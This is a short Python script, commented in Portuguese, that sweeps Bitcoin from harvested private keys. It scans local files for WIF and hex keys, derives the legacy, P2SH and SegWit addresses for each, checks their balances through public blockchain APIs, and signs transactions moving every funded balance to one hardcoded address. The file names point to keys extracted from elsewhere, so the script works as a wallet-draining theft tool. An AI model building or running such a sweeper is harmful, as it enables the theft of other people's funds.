import requests
import re
import time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = [
    'privatekeys.txt', 
    'priv.key.rtf', 
    'chavprivelet1.txt', 
    'chaves_extraidas_e_enderecos_1.txt',
    'enderecos.txt'
]

def check_balance(address):
    """Consulta saldo em APIs com fallback"""
    apis = [
        f"https://mempool.space/api/address/{address}/utxo",
        f"https://blockstream.info/api/address/{address}/utxo"
    ]
    for api in apis:
        try:
            r = requests.get(api, timeout=5)
            if r.status_code == 200:
                utxos = r.json()
                return sum(u['value'] for u in utxos), utxos
        except: continue
    return 0, []

def create_tx(addr, wif, utxos):
    try:
        total = sum(u['value'] for u in utxos)
        fee = 10000 
        amount = total - fee
        if amount > 1000:
            tx = Transaction(network='bitcoin')
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            print(f"HEX_GEN:{tx.raw_hex()}")
    except: pass

def run_scan():
    found_raw = []
    # 1. Extração de padrões de chaves privadas
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                # WIF format (Legacy/Segwit)
                found_raw.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
                # Hex format (64 chars)
                found_raw.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
        except: continue

    # 2. Verificação de Saldo
    for raw_key in set(found_raw):
        for compressed in [True, False]:
            try:
                k = Key(raw_key, network='bitcoin', compressed=compressed)
                # Testa endereços Legacy, P2SH e Native Segwit para cada chave
                addresses = [
                    k.address(), 
                    k.address(witness_type='p2sh-p2wpkh'), 
                    k.address(witness_type='p2wpkh')
                ]
                for addr in addresses:
                    balance, utxos = check_balance(addr)
                    if balance > 0:
                        print(f"💰 SALDO DETECTADO: {addr} ({balance} sats)")
                        create_tx(addr, raw_key, utxos)
                    time.sleep(0.5) # Respeita limite das APIs
            except: continue

if __name__ == "__main__":
    run_scan()
    
